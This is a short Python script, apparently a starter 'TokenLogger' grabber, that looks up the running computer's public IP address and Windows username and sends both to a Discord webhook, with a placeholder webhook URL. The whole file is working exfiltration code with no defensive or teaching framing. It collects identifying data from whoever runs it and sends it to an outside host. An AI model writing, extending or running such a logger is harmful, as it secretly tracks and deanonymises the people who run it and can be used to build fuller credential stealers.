from urllib.request import urlopen, Request
from discord_webhook import DiscordWebhook, DiscordEmbed
import os

ip = urlopen(Request('https://api.ipify.org/')).read().decode()
name = os.getenv('UserName')
webhook = DiscordWebhook(url = 'YourWebhookURL', username = 'TokenLogger', content = str(f'{ip}\n{name}'))
embed = DiscordEmbed(title = 'Hello', color = 242424)

webhook.add_embed(embed)
reponse = webhook.execute()
